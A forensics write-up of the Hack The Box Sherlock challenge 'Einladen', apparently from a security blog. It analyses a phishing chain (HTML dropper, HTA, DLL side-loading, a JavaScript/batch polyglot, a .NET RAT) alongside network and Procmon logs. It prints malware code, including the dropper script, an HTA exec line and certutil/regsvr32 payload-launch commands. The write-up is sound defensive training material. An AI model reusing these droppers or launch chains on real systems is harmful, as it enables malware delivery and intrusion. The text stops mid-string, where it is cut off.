---
title: HTB Sherlock: Einladen
url: https://0xdf.gitlab.io/2024/05/02/htb-sherlock-einladen.html
date: 2024-05-02T11:51:36+00:00
difficulty: Medium
tags: sherlock-einladen, htb-sherlock, sherlock-cat-dfir, hackthebox, ctf, forensics, dfir, malware, phishing, html, hta, decoy-document, dll-side-loading, authenticode, virus-total, wireshark, pcap, tshark, zulip-chat, aws, procmon, javascript, polyglot, batch, any-run, sandbox, youtube, lolbas, dotpeek, dotnet, aes, cyberchef, dnspy, pbkdf2, anti-debug, scheduled-task
---

![Einladen](/icons/sherlock-einladen.png)

Einladen starts with a ton of artifacts. I’ll work through a phishing HTML page that downloads a Zip with an HTA that creates three executables and a PDF, then runs one of the executables. The one it runs is a legit Microsoft binary, but the DLLs are malware, side-loaded by the legit binary. That binary connects to a chat service as C2. There’s also a JavaScript / bat polyglot that presumably is downloaded and run by the malware that starts another infection chain, this time running another RAT that is written in .NET. I’ll figure out how to decrypt it’s settings (both dynamically and with some really fun CyberChef foo), and understand how it works.

## Challenge Info

| Name | [Einladen](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2feinladen)  [Einladen](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2feinladen) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2feinladen) |
| --- | --- |
| Release Date | 13 November 2023 |
| Retire Date | 4 April 2024 |
| Difficulty | Medium |
| Category | DFIR DFIR |
| Creator | [thewhitefriday thewhitefriday](https://app.hackthebox.com/users/1720283) |

## Background

### Scenario

> Our staff recently received an invite to the German embassy to bid farewell to the Germany Ambassador. We believe this invite was a phishing email due to alerts that fired on our organisation’s SIEM tooling following the receipt of such mail. We have provided a wide variety of artifacts inclusive of numerous binaries, a network capture, DLLs from the host system and also a .hta file. Please analyse and complete the questions detailed below!

Notes from the scenario:
- There’s a phishing email likely having to do with the German embassy. (Task 3)
- HTA files are HTML documents that are also applications, and can run code. This is likely the phishing attachment.
- There’s a bunch of artifacts to go through!

### Questions

To solve this challenge, I’ll need to answer the following 19 questions:
1. The victim visited a web page. The HTML file of the web page has been provided as ‘downloader.html’ sample file. The web page downloadsa ZIP file named ‘Invitation\_Farewell\_DE\_EMB.zip’. What is the SHA-256 hash of the ZIP file?
2. Thedownloaded ZIP file contains a HTA file, which creates multiple files. One of those files is a signed fileby Microsoft Corporation. In HTA file, which variable’s value was the content of that signed file?
3. The threat actor was acting as an embassy of a country. Which country was that?
4. The malware communicatedwith a chatting platform domain. What is the domainname (inclusive of sub doamain) the malware connects to?
5. How many DNS A records were found for that domain?
6. It seems like the chatting service was running on a very known cloud service using a FQDN, where the FQDN contains the IP address of the chatting domain in reversive format somehow. What is the FQDN?
7. What was the parent PID (PPID) of the malware?
8. What was the computer name of the victim computer?
9. What was the username of the victim computer?
10. How many times were the Windows Registry keys set with a data value?
11. Did the malicious mso.dll load by the malware executable successfully?
12. The JavaScript file tries to write itself as a .bat file. What is the .bat file name (name+extension) it tries to write itself as?
13. The JavaScript file contains a big text which is encoded as Base64. If you decode that Base64 text and write its content as an EXE file. What will be the SHA256 hash of the EXE?
14. The malware contains a class Client.Settings which sets different configurations. It has a variable ‘Ports’ where the value is Base64 encoded. The value is decrypted using Aes256.Decrypt. After decryption, what will be its value (the decrypted value will be inside double quotation)?
15. The malware sends a HTTP request to a URI and checks the country code or country name of the victim machine. To which URI does the malware sends request for this?
16. After getting the country code or country name of the victim machine, the malware checks some country codes and a country name. In case of the country name, if the name is matched with the victim machine’s country name, the malware terminates itself. What is the country name it checks with the victim system?
17. As an anti-debugging functionality, the malware checks if there is any process running where the process name is a debugger. What is the debugger name it tries to check if that’s running?
18. For persistence, the malware writes a Registry key where the registry key is hardcoded in the malware in reversed format. What is the registry key after reversing?
19. The malware sets a scheduled task. What is the Run Level for the scheduled task/job it sets?

### Data

The zip archive has 12 files in it:

```

oxdf@hacky$ unzip -l einladen.zip 
Archive:  einladen.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2560  2023-07-28 01:25   AppVIsvSubsystems64.dll
   300159  2023-08-12 12:46   downloader.html
    62976  2023-08-29 23:05   EmpireClient.exe
   301270  2023-07-28 01:25   Invitation_Farewell_DE_EMB.hta
    83855  2023-08-30 05:04   Invitation_Farewell_DE_EMB.zip
    25170  2023-07-28 01:25   Invitation.pdf
 15310453  2023-08-16 12:07   Logfile.PML
    33280  2023-07-28 01:25   mso.dll
    60320  2023-07-28 01:25   msoev.exe
    54100  2023-08-16 12:04   msoev.pcapng
  2779156  2023-08-09 11:26   sheet.hta
   177938  2023-08-29 23:04   unc.js
---------                     -------
 19191237                     12 files

```

### Artifact Background

There’s a bunch of files which I can group and talk about the tools that I might need to analyze them.

#### Documents / Archives

There is a PDF document and a Zip archive in the artifacts. Typically these don’t run code, but rather are used in social engineering (there are some ways to get execution from a PDF, but these are very locked down by 2024).

I’ll be wanting to look at what files are in the Zip archive, and if there is any data appended to the end of the file (where hiding malware or malicious scripts is a common practice).

For the PDF, I can use tools like `pdf-parser.ph` and `pdfid.py` (both from [Didier Stevens](https://blog.didierstevens.com/my-software/)) to see what might be embedded in it, and just a PDF reader to see if it’s used as a social engineering attack.

#### Code

There are four files with the extensions `.html`, `.hta`, and `.js`. These files are capable of running code. HTML can run embedded or referenced JavaScript. `.js` files are JavaScript files. `.hta` are web applications that can contain JavaScript or VBScript.

I’ll analyze these in a text editor or an IDE like VSCode.

#### Executables

There are four files that have `.dll` or `.exe` extensions, representing Windows executables:

```

oxdf@hacky$ file *.dll *.exe
AppVIsvSubsystems64.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
mso.dll:                 PE32+ executable (DLL) (GUI) x86-64 (stripped to external PDB), for MS Windows
EmpireClient.exe:        PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
msoev.exe:               PE32+ executable (GUI) x86-64, for MS Windows

```

`EmpireClient.exe` is a Mono/.Net assembly, which means I can use a tool like [DotPeek](https://www.jetbrains.com/decompiler/) to get very close to source code for review. The other three are binaries that will require something like [Ghidra](https://ghidra-sre.org/) to reverse engineer.

#### Log Data

The last two files are log data. Despite what `file` says about it, `Logfile.pml` is a PML (Process Monitor Log) file is a binary file. It’s a binary format [described here](https://github.com/eronnen/procmon-parser/blob/master/docs/PML%20Format.md), and the data saved from [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) or procmon, a tool from Microsoft SysInternals. The file can be loaded into procmon, or if I want to interact with the logs via Python, I can use [procmon-parser](https://github.com/eronnen/procmon-parse).

`msoev.pcapng` is a PCAP file, like in [Meerkat](/2024/04/23/htb-sherlock-meerkat.html) or [Knock Knock](/2023/12/04/htb-sherlock-knock-knock.html). Wireshark is the go-to tool here, or `tshark` from the command line.

### Artifacts Relationships

When analyzing so many files, it’s a good idea to get an idea for how they all fit together. I’ll develop this over the course of the analysis, with the end result being this::

```

flowchart TD;
    A[<a href="/2024/05/02/htb-sherlock-einladen.html#downloaderhtml">downloader.html</a>]-->B[<a href="/2024/05/02/htb-sherlock-einladen.html#invitation_farewell_de_embzip">Invitation_Farewell_DE_EMB.zip</a>];
    B-->C[<a href="/2024/05/02/htb-sherlock-einladen.html#invitation_farewell_de_embhta">Invitation_Farewell_DE_EMB.hta</a>];
    C-->D[<a href='/2024/05/02/htb-sherlock-einladen.html#pdf'>Invitation.pdf</a>];
    C-->E;
    C-->F;
    C-->G;
    subgraph malware[" "]
        E[<a href="/2024/05/09/htb-sherlock-einladen-malware-re.html#msoevexe">msoev.exe</a>];
        F[<a href="/2024/05/09/htb-sherlock-einladen-malware-re.html#msodll">mso.dll</a>];
        G[<a href="/2024/05/09/htb-sherlock-einladen-malware-re.html#appvisvsubsystems64dll">AppVIsvSubsystems64.dll</a>];
        H[<a href="/2024/05/02/htb-sherlock-einladen.html#pcap">msoev.pcapng</a>];
        I[<a href="/2024/05/02/htb-sherlock-einladen.html#procmon-logs">Logfile.PML</a>];
    end
    E-. ? .->J[<a href="/2024/05/02/htb-sherlock-einladen.html#uncjs">unc.js</a>];
    J-->K[<a href="/2024/05/02/htb-sherlock-einladen.html#bat-file-analysis">richpear.bat</a>];
    K-->L[<a href="/2024/05/02/htb-sherlock-einladen.html#empireclientexe">EmpireClient.exe</a>];
    M[sheet.hta];

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 6 stroke-width:2px,stroke:#FFFF99,fill:none;
style malware fill:#666;

```

All of these files were in the artifacts, except for `richpear.bat`, but it is a copy of `unc.js` (yay polyglots!).

## Malware Download

### downloader.html

#### HTML

It all starts with this `downloader.html` file, which is only 32 lines long (though line 10 is very long):

```

<!DOCTYPE html>
<html>
<head>
<title>Invitation_Farewell_DE_EMB</title>
</head>
<body>
<script>

var d = [80,75,3,4,20,3,0,0,8,0,187,75,242,86,252,105,4,...[snip]...];

var e = new Uint8Array(d);
var f = new Blob([e], {type: "application/zip"});

var fileName = 'Invitation_Farewell_DE_EMB.zip';

if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(f,fileName);
} else {
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    
    var url = window.URL.createObjectURL(f);
    a.href = url;
    
    a.download = fileName;
    a.click();
}
</script>
</body>
</html> 

```

The `body` tag has only a `script tag`. The script takes this long list of integers, and creates an array of bytes from it (`e`) and then turns that into a [blob](https://developer.mozilla.org/en-US/docs/Web/API/Blob) object with the name `Invitation_Farewell_DE_EMB.zip`. Then it tries two different ways to download that file to the user’s computer.

Opening this in Firefox on my Linux VM, it is just a blank page, but there’s a newly downloaded file:

![image-20240501130215633](/img/image-20240501130215633.png)

This file is the same as the one given in the artifacts (Task 1):

```

oxdf@hacky$ sha256sum ~/Downloads/Invitation_Farewell_DE_EMB.zip  Invitation_Farewell_DE_EMB.zip 
5d4bf026fad40979541efd2419ec0b042c8cf83bc1a61cbcc069efe0069ccd27  /home/oxdf/Downloads/Invitation_Farewell_DE_EMB.zip
5d4bf026fad40979541efd2419ec0b042c8cf83bc1a61cbcc069efe0069ccd27  Invitation_Farewell_DE_EMB.zip

```

#### Invitation\_Farewell\_DE\_EMB.zip

The Zip has a single `.hta` file in it:

```

oxdf@hacky$ unzip -l Invitation_Farewell_DE_EMB.zip                                          
Archive:  Invitation_Farewell_DE_EMB.zip          
  Length      Date    Time    Name
---------  ---------- -----   ----
   301270  2023-07-18 09:29   Invitation_Farewell_DE_EMB.hta
---------                     -------
   301270                     1 file   

```

Comparing the hashes of this file with the given file of the same name shows they are also the same.

#### Invitation\_Farewell\_DE\_EMB.hta

The HTA file has four blocks that take a similar action, writing a file. For example, the start of the file:

![image-20240501130654436](/img/image-20240501130654436.png)

The `mso` variable has a over sixteen thousand ints, each with a two-byte values (0-65535). It creates a binary blob, `content`, from those ints, and then uses an ActiveX `filesystemobject` to write first “MZ” (the magic bytes of a Windows executable) and then the blob file to `C:\windows\tasks\mso.dll`.

The four files written are:

| Filename | Variable | Hardcoded Magic Bytes |
| --- | --- | --- |
| `C:\Windows\Tasks\mso.dll` | `mso` | “MZ” |
| `C:\Windows\Tasks\msoev.exe` | `msoev` | “MZ” |
| `C:\Windows\Tasks\AppVIsvSubsystem64.dll` | `app` | “MZ” |
| `.\Invitation.pdf` | `pdf` | “%P” |

At the end of the file, there’s a second script that runs `msoev.exe`:

```

<script language="vbscript">
CreateObject("WScript.Shell").Exec "C:\\windows\\tasks\\msoev.exe"
</script>

```

#### Recover Files

I’ll make a copy of the `.hta` file named `Invitation_Farewell_DE_EMB-noexec.hta`, and remove the `script` block that runs the `.exe`.

Then I can double-click the neutered HTA file safely, knowing it will only write these four files, not run them. When I’m done, the three files are in `C:\windows\tasks`:

![image-20240501131732807](/img/image-20240501131732807.png)

There is also an `Invitation.pdf` in whatever folder the HTA was run from. All four of these files are exact hash matches for the files with the same name in the artifacts.

### PDF

I’ll check `Invitation.pdf` for any signs of attempts to do something malicious with `pdfid.py`:

```

oxdf@hacky$ pdfid.py Invitation.pdf 
PDFiD 0.2.8 Invitation.pdf
 PDF Header: %PDF-1.5
 obj                   38
 endobj                38
 stream                36
 endstream             36
 xref                   0
 trailer                0
 startxref              1
 /Page                  0
 /Encrypt               0
 /ObjStm                1
 /JS                    0
 /JavaScript            0
 /AA                    0
 /OpenAction            0
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /URI                   0
 /Colors > 2^24         0

```

This looks very much like a static document. Opening it in a PDF viewer (on a Linux VM to be safe), it looks like a decoy document from the embassy of Germany (Task 3):

![image-20240501133945236](/img/image-20240501133945236.png)

This is meant to give the target a feeling that they know what they just opened, distracting them from the fact that they have also run malware.

### Executable Signature Analysis

Looking at the properties of the three generated executables, `msoev.exe` is signed by Microsoft:

![image-20240501131945835](/img/image-20240501131945835.png)

Unlike in [Subatomic](/2024/04/18/htb-sherlock-subatomic.html#signature), this signature is valid:

![image-20240501132042480](/img/image-20240501132042480.png)

The other two are not signed, so the variable that generated the signed executable is `msoev` (Task 2).

### Virus Total

I’ll find [this file in VirusTotal](https://www.virustotal.com/gui/file/06cea3a5ef9641bea4704e9f6d2ed13286f9e5ec7ab43f8067f15b5a41053d33), and it seems to be a legit Microsoft file:

![image-20240501132259689](/img/image-20240501132259689.png)

It seems likely that this file loads these two libraries (DLLs). Windows always checks the current directory before searching the rest of the path to look for DLLs, so there’s a common technique known as [DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/) where the attacker drops the legitimate binary and a malicious DLL it will load in the same directory and then runs the legit binary. It will look like a signed Microsoft executable running, but when it loads the malicious library that code runs as well.

In looking around about this executable, I’ll find [this blog post](https://gbhackers.com/hackers-use-weaponized-pdfs/amp/) which is perhaps what this attack is based on.

Both [mso.dll](https://www.virustotal.com/gui/file/ae79aa17e6f3cc8e816e32335738b61b343e78c20abb8ae044adfeac5d97bf70) and [AppVIsvSubsystems64.dll](https://www.virustotal.com/gui/file/4da57027ffe7e32c891334d6834923bc17e4174c53ace4ff69de6410c24d84cb) do come up as malicious in VT:

![image-20240501133120716](/img/image-20240501133120716.png)

![image-20240501133205571](/img/image-20240501133205571.png)

It’s a bit surprising that `AppVIsvSubsystem` is so negative. Quick analysis in Ghidra shows it has only two functions, and both immediately return. I suspect this is here just to make sure that the legit Microsoft binary doesn’t crash, but also doesn’t do anything. `mso.dll` is the malware.

## PCAP

### Overview

`msoev.pcapng` has 362 packets, which is relatively small when it comes to PCAPs:

![image-20240501141200978](/img/image-20240501141200978.png)

Given the name, I’m going to assume (while open to seeing evidence to the contrary) that it’s traffic generated by `msoev.exe`.

Statistics -> Protocol Hierarchy shows some HTTP and HTTPS, but not much else:

![image-20240501141259010](/img/image-20240501141259010.png)

I’ll want to check out the DNS as well.

Under Statistics -> Endpoints, I’ll see that the host running the malware is likely 192.168.0.105, and it makes HTTPS connections to several IPs, and one HTTP connection:

![image-20240501143107623](/img/image-20240501143107623.png)

On the UDP tab, there’s DNS and UPnP traffic:

![image-20240501143201423](/img/image-20240501143201423.png)
192.168.0.1 is likely the gateway / DNS server.

### DNS

A nice trick to pull out all the DNS resolutions is with `tshark`:

```

oxdf@hacky$ tshark -r msoev.pcapng -Y 'dns' -Y "dns.flags.response eq 1"
...[snip]...Standard query response 0xda19 A dns.msftncsi.com A 131.107.255.255 92
...[snip]...Standard query response 0x10cf No such name PTR 115.2.168.192.in-addr.arpa SOA 168.192.IN-ADDR.ARPA 141
...[snip]...Standard query response 0x10cf No such name PTR 115.2.168.192.in-addr.arpa 86
...[snip]...Standard query response 0x0f17 A toyy.zulipchat.com A 35.171.197.55 A 52.202.201.139 A 54.144.187.26 A 54.165.90.198 A   50.17.237.238 A 34.227.35.232 174
...[snip]...Standard query response 0x3bf0 PTR 55.197.171.35.in-addr.arpa PTR ec2-35-171-197-55.compute-1.amazonaws.com 141
...[snip]...Standard query response 0x459a A o.ss2.us A 52.84.225.221 A 52.84.225.169 A 52.84.225.29 A 52.84.225.131 132
...[snip]...Standard query response 0x0434 PTR 221.225.84.52.in-addr.arpa PTR server-52-84-225-221.sin2.r.cloudfront.net 142
...[snip]...Standard query response 0xf061 No such name PTR 107.0.168.192.in-addr.arpa SOA 168.192.IN-ADDR.ARPA 141
...[snip]...Standard query response 0xf061 No such name PTR 107.0.168.192.in-addr.arpa 86
...[snip]...Standard query response 0x06da No such name PTR 110.0.168.192.in-addr.arpa SOA 168.192.IN-ADDR.ARPA 141
...[snip]...Standard query response 0x06da No such name PTR 110.0.168.192.in-addr.arpa 86
...[snip]...Standard query response 0xb6fb No such name PTR 126.0.168.192.in-addr.arpa SOA 168.192.IN-ADDR.ARPA 141
...[snip]...Standard query response 0xb6fb No such name PTR 126.0.168.192.in-addr.arpa 86
...[snip]...Standard query response 0xa607 No such name PTR 147.2.168.192.in-addr.arpa SOA 168.192.IN-ADDR.ARPA 141
...[snip]...Standard query response 0xa607 No such name PTR 147.2.168.192.in-addr.arpa 86

```

I’m not as interested in `PTR` records, so I’ll get just the `A` records:

```

oxdf@hacky$ tshark -r msoev.pcapng -Y "dns.flags.response == 1 && dns.qry.type == 1"
...[snip]...Standard query response 0xda19 A dns.msftncsi.com A 131.107.255.255 92
...[snip]...Standard query response 0x0f17 A toyy.zulipchat.com A 35.171.197.55 A 52.202.201.139 A 54.144.187.26 A 54.165.90.198 A   50.17.237.238 A 34.227.35.232 174
...[snip]...Standard query response 0x459a A o.ss2.us A 52.84.225.221 A 52.84.225.169 A 52.84.225.29 A 52.84.225.131 132

```

`toyy.zulipchat.com` is related to the [Zulip chat service](https://zulip.com/) (Task 4), and the DNS request returned 6 records for the domain (Task 5).

Looking more closely with the filter `dns` in Wireshark, after getting this response, something immediately makes a request for `55.197.171.35.in-addr.arpa`:

![image-20240501142434814](/img/image-20240501142434814.png)

This is a reverse DNS lookup for any domain names associated with the IP 35.171.197.55 (for some reason these requests use the IP octets in reverse order). The response shows it’s an Amazon AWS host, `ec2-35-171-197-55.compute-1.amazonaws.com` (Task 6):

![image-20240501142551186](/img/image-20240501142551186.png)

### HTTP

The HTTP request is an [Online Certificate Status Protocol](https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol) (OCSP) request:

![image-20240501143558886](/img/image-20240501143558886.png)

Nothing interesting as far as the malware, and the rest of the PCAP is just TLS traffic I can’t see.

## Procmon Logs

### Overview

#### Initial Filters

I’ll open the `Logfile.PML` file with Procmon in my Windows VM. I’ll un-select Profiling events (leaving the other four types selected), which leaves just over six thousand events (4.3%) showing:

![image-20240501155152694](/img/image-20240501155152694.png)

Every single one of these events has the process `msoev.exe`.

#### Process Tree

I’ll check out the Tools -> Process Tree…, and find `msoev.exe` with PID 10044 as a child of `Explorer.exe` with PID 4156 (Task 7):

![image-20240501160415927](/img/image-20240501160415927.png)

This also gives the hostname of the computer, DESKTOP-O88AN4O (Task 8).

#### Stack Summary

I’ll also look at the Tools -> Stack Summary to see where the stack sits:

![image-20240501162737109](/img/image-20240501162737109.png)

There’s not a ton here, but I can see that `mso.dll` has been loaded, and scrolling over I’ll see the full path on the desktop.

### Process Events

Reducing to just the Process/Thread events, I’ll see the process start and all the DLLs it uses load, including both malicious DLLs:

![image-20240501155938997](/img/image-20240501155938997.png)

For some reason, the malware is running from `C:\Users\TWF\Desktop`, rather than `C:\Windows\Tasks\`. I can’t explain this, other than perhaps the analyst moved the files. That does give the username (Task 9), and it’s clear that `mso.dll` is loaded successfully (Task 11).

### File Events

Filtering on file events, almost all of the 854 events are the process trying to open DLLs to load them. If I add a filter for Path ending with `.exe`, I’ll notice PowerShell is interacted with:

![image-20240501161440520](/img/image-20240501161440520.png)

Given that this output seems to be filtered on Process Name of `msoev.exe`, I don’t see any new process start. Still, that’s suspicious.

### Registry Events

Filtering on Registry events, there are over five thousand, so not worth looking at one by one. Windows is constantly checking reg keys, so this isn’t surprising. It’s always worth looking at what might have been modified. I’ll add a filter on Operation is “RegSetValue”, and there are 11 events remaining (Task 10):

![image-20240501162210611](/img/image-20240501162210611.png)

Most of these seem to be setting the internet settings to allow a connection out.

### Network Events

There are 58 network events, each of which a TCP connection to one of the cloud provided associated with the Zulip chat service in the DNS analysis [above](#dns):

![image-20240501163230435](/img/image-20240501163230435.png)

Nothing too interesting here, although it’s another way to see the hostname (Task 8).

## unc.js

### Overview

I don’t know exactly what the malware is doing, but rather than turn to Ghidra to reverse the DLL (I may come back to that), I’ll guess that maybe it downloads from Zulip and runs `unc.js` (or the other HTA or EXE). `unc.js` is structured like this:

![image-20240501192254327](/img/image-20240501192254327.png)

It’s only 34 lines, and only the last one is outside of the comment. If I turn off line wrap, the overall structure of the file becomes more clear:

![image-20240501193908418](/img/image-20240501193908418.png)

Lines 28 and 34 are very long, and 29-32 are a bit long.

### Sandbox

Rather than try to crack the JavaScript on my own, I’ll find [this sandbox run](https://app.any.run/tasks/7f7626b2-1354-440f-b94e-1e8b270de4f3/) from Any.run. What’s cool is that it will show the processes generated by the script:

![image-20240501194042840](/img/image-20240501194042840.png)

I suspect the JavaScript is calling:

```

"C:\Windows\System32\cmd.exe" /k copy "C:\Users\admin\AppData\Local\Temp\unc.js" "C:\Users\admin\AppData\Local\Temp\\richpear.bat" && "C:\Users\admin\AppData\Local\Temp\\richpear.bat"

```

It’s copying itself to `richpear.bat` (Task 12) and running itself. The file is a polyglot JavaScript / Bat file!

### Bat File Analysis

At this point I could just move to the base64-encoded data, assuming that the Bat file decodes and runs it, but the polyglot file is super cool, and I’ll explain it in [this video](https://www.youtube.com/watch?v=EaEaiqScvjA):

The result is that it calls:

```

cd %temp% &echo adviserake
findstr /V adviserake "%0" > jumpyflame
certutil -f -decode jumpyflame rosecomb.dll &echo adviserake
regsvr32 rosecomb.dll &echo adviserake

```

It uses `findstr /v` to get any lines that don’t have “adviserake”, which is only line 28, the base64 blob, and saves that as `jumpyflame`. Then it uses `certutil` to base64 decode that file, saving it as `rosecomb.dll`. Finally, it calls `regsvr32 rosecomb.dll`. The `echo adviserake` lines are probably just to ensure those lines get removed when trying to isolate the base64.

### Create Exe

I’ll follow the same path that the Bat file did, using `grep` to select the base64 line, and then decoding it. There is a `\r` (windows uses `\r\n` for newlines, where Linux uses `\n`) that needs removing or the `base64 -d` gives an error (though skipping this part does return the same result):

```

oxdf@hacky$ grep -v adviserake unc.js | tr -d '\r' | base64 -d > unc.js.exe

```

It’s a .NET Windows executable:

```

oxdf@hacky$ file unc.js.exe
unc.js.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

```

With the same SHA256 hash (Task 13) as `EmpireClient.exe`:

```

oxdf@hacky$ sha256sum unc.js.exe EmpireClient.exe 
db84db8c5d76f6001d5503e8e4b16cdd3446d5535c45bbb0fca76cfec40f37cc  unc.js.exe
db84db8c5d76f6001d5503e8e4b16cdd3446d5535c45bbb0fca76cfec40f37cc  EmpireClient.exe

```

## EmpireClient.exe

### Core Functions

#### Main

Because it’s a .NET assembly, I’ll open `EmpireClient.exe` in [DotPeek](https://www.jetbrains.com/decompiler/), where it shows seven namespaces:

![image-20240501203541799](/img/image-20240501203541799.png)

The `Main` function is in `Client`, in the `Program` class:

![image-20240501204117748](/img/image-20240501204117748.png)

`Main` calls two functions:

```

    public static async Task Main()
    {
      ThreadStartFunction.Start(true);
      ConnectionIS.Start(true);
    }

```

#### ConnectionIs

`ConnectionIS.Start(true)` just runs an infinite loop checking `Client.Connection.ClientSocket.IsConnected`, and if not, runs `ClientSocket.Reconnect()` and then `ClientSocket.InitializeClient()`:

```

    public static void Start(bool Confirm)
    {
      if (!Confirm)
        return;
      while (true)
      {
        try
        {
          if (!ClientSocket.IsConnected)
          {
            ClientSocket.Reconnect();
            ClientSocket.InitializeClient();
          }
        }
        catch
        {
        }
        Thread.Sleep(5000);
      }
    }

```

#### ThreadStartFunction

The `Start` function seems to start the malware:

```

    public static void Start(bool Confirm)
    {
      if (!Confirm)
        return;
      Thread.Sleep(Convert.ToInt32(Settings.Delay) * 1000);
      if (!Settings.InitializeSettings() || !MutexControl.CreateMutex())
        Environment.Exit(0);
      if (Convert.ToBoolean(Settings.AntiSNG))
        Antisng.GetSNG();
      if (Convert.ToBoolean(Settings.Anti))
        Anti_Analysis.RunAntiAnalysis();
      if (Convert.ToBoolean(Settings.Exclusion))
        Methods.go();
      if (Convert.ToBoolean(Settings.Install))
        NormalStartup.Install();
      if (Convert.ToBoolean(Settings.Dis))
        DisableCMD.DisableRegEdit();
      if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
        ProcessCritical.Set();
      Methods.PreventSleep();
    }

```

There is a series of actions / checks that I can guess at based on their names:
- Sleeps for some period of time.
- Initialize settings and verify mutex is available (this isn’t already running).
- Checks for “SNG” and “Analysis”, likely looking for virtualization and other malware analysis / sandbox tools.
- If configured to do so, install.
- If configured to do so, disable regedit.
- If admin and configured to do so, set the process as critical.

I’ll look more at the interesting ones of these.

### Settings

#### Overview

The settings class initializes a bunch of values to base64-encoded blobs, and then resets them by decrypting them using `Settings.Key`:

```

  public static class Settings
  {
    public static string Ports = "Yhc6k+R99kweya1xRMDhAdRjrYVuSxpgA2Lefoj5KOsbK3OcJtOpNfDubKUTCiWHoVrnnwqj70kyfYTLboawyVxN0W+L/MRchSITSNbbgXE=";
    public static string Hosts = "+Pbo5xZMrhjJHx3HhdYJHkdh+q2pyg1yYZl97b022jvSVzHjr+oe/3vVbtUvDCoDAsW+jMBLbtKBffWq8x27DFTDV3EK9RJnd3SY6OBD8Go=";
    public static string Version = "ssb/v81WeADBRfbe9M/7eSpC2s49+mveJLfx7kOUI3B4diuHskGJkI1FzeqxWu7qeRnDraPW61pNhdmLsJ+grg==";
    public static string Install = "sfeC87COnALdrHVVCDxlHJEB1uRr3rJ0QctWWhGh8YUdP4s5OYNe5E+/sAANdDv8qNEYnkUbyIG6lkL9eKRlNw==";
    public static string Exclusion = "CfiLwlGDxa4O8CG2GbMBzC6iP/NAkapbFuBeCHZIGw4i6qEuwMZhvDIDOcuHfmeOgX43yhc0wenMoXUm4ewHSg==";
    public static string AntiSNG = "gw+07GmfMkuqpA7fSi8Hg+dIynp80bLWBX62S+PhELhax1wNdaBA/czC2vp3WVcdBFH6pWpGm9EBtox5StOqKw==";
    public static string InstallFolder = "%AppData%";
    public static string InstallFile = "Apple-iTunes.exe";
    public static string Key = "d0cyOFJwZlBBSXBnalhEVFd2bEdiVHRkQnpybnRBeVM=";
    public static string MTX = "arUJ8ojv247SWGDRlcWCxqLl90incqYsCMhtzH0fpDR8U7xlWYKEKA6ZgYV5rAi7mKyzIneB67ywpLCqVG44GQ==";
    public static string Certificate = "IZeastBHBrDqLWFiSEDNF8Qa3AZtG8MQUgwRkoqpzUXwh638FhR4fI98+Nm0bDmHtOaGNMsLwi2+V2n1B8wqpUJZ5KoMn+AmS/6s9V7ub4uEjoYtzdGeU/AImWoT98z7R+QV3lq4T6ripQUjV9+8ScI699Naxx2IxEVirRSY7eqqvatd9VW2fK7E42yxQT9RMr16/PIfZ6l8DKT8ga8PRhaowLMVGakunMZX8NhDpWcf7YQnrwDcJcl1MD0utZHnxSXg3d0Hf8PC85Ep7l/voyDhjCj/JEtvObY9JczPMaOeoMNNhiueKvpQFM6NZeFu/L+shNq7WH9uB9tyzFpG5WzbS0Z5UJgI8FB/vkaoMKE0XpmpnWb7vBBIKjmQe5YDHJhmTG+mz+qwwPEwUN2r1ns5fZ1z3VOu85ZCcW26qINwUXwT6gnscQFTe3X1J24j4aRsq28jzwNGb7K8n1PmfT5UHfkhV7+9s2T+z2seq85hPJFTuSywYRKPyG7ED5SBfpR5awGuxb+S3zW6i5tO6+kAGeNqd7nX4O49dqbbhCkZ+jv25KmGBZwNuVclWZvfQ9ff/hr4HU2i4ePsFPeG+EM9JRH/rZny6TZCSSamV6/LVxlz0SzwW4SWr22ccELxgoDRcBMzFgqb6EqdktGWIhF+0Y2nT/x2y+TtGDi7UwxVFuCQmQyBXpyjswaN9qG+j9BjclOu000F9Tm/omLo7A2MLi0o7eGNaKQkwzCb2jdNy88zbYd/IcJjdzZkE6TRP6sbQRfkUWSSnj+9MlciSwdbNf8943ms0+PHT3Jxl/pmueEstU+UDdKIwkG5HfiSDqMw6mAFzImt5Flry5kpd4DyKQRYjPIxAXklt4pyOkKP5WoWYyzmWgjF4+iz7YO1OFQUZStK5JNpzK32yqJlGAVO0Er8Hf4naiVrnSKNMrvSLStWw5hw7nADBSaSE3fUxMjNzDJkGqL/LlGvbdiFoQnMhC5kQy7GMR3svRrpXqFl3igPsicaVy4kFD1YOePoXnNrsqIbOVk79e7zWiuIQs+ChbyDtfXoX06ftRDQEFWG/qhDI9qA8yw1fSfpkA43lg/bvzCwCvoy4Zc8IfejcTQ14aOKsjpY43b1iAnrIVHit37ugYaEPAY/2uqetGlclhH0svTYk88zRwOHbzFdOk8pRPMfF1VtTd4NeTQTQOIzx/zR+lnnbx08JvhnakLJK3bc+lB+LvLAjQDiVT86kLZdBgyAtIdT+zDdrUKX6vbQgmwNcB1FLXmXlgoUBPi+qwFOirvdXKmVHWr506GfVfEpfV2iO08UaEdz0+tY94LZQPJjBVqcBkB/8cpOgN5RrjXqfYwTcbCpAfsSsj8iMU1WCh8rD2MhyKfhXAMVKddM1dbSGUG7PESYtdL08qz8dBWTQutvhZIxRbStDI2JoJPQQeBdIz6NyAm2ZrFODXd/mcqfPBNjQ+pVsi9ETbR/y6HHoajHz4EYXT160QsV0PyTzTNTOeU49VAIbYAs+YpXWWxte9W6GN1BeW2N3xdV3WIMJV0hjpQuVWY